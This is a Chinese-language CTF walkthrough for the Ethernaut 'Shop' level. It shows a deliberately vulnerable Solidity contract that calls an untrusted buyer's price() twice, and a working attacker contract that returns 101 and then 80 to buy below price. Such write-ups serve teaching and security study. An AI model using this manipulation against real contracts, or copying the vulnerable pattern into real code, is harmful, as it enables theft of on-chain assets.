# Ethernaut 21-Shop

## 本关目标

- 以低于 price 的价格购买商品

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    // 调用buyer的价格高于商品价格并且商品没有出售
    if (_buyer.price() >= price && !isSold) {
      isSold = true; // 进来首先设置商品出售
      price = _buyer.price(); // 再次调用修改价格
    }
  }
}
```

## 解决方案

1. 构造 Hack 合约，提供 price()方法，在其中根据 isSold 来设置 price，isSold=false，返回 101，当 isSold 被修改为 true 时，再次调用 price 返回 80， 这样就修改 price 小于之前价格

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Shop.sol";

contract Hack{

    Shop private shop;
    constructor(address target){
        shop = Shop(target);
    }

    function hack() external {
        shop.buy();
    }

    function price() external view returns(uint){
        if(shop.isSold()) {
            return 80;
        } else {
            return 101;
        }
    }
}
```
